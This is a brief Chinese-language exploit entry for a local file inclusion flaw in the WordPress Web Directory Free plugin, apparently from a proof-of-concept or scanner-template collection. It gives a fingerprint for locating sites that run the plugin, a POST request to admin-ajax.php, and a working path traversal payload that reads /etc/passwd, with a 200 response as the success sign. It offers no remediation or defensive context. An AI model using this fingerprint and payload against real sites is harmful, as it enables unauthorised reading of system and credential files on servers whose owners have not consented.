# WordPressWebDirectoryFree插件本地包含漏洞

WordPress ｜ 其他 ｜ —
- **指纹**：`body="/wp-content/plugins/web-directory-free"`
- **请求**：`POST /wp-admin/admin-ajax.php HTTP/1.1`

**Payload**
```
from_set_ajax=1&action=w2dc_controller_request&template=../../../../../etc/passwd
```
- **响应特征**：200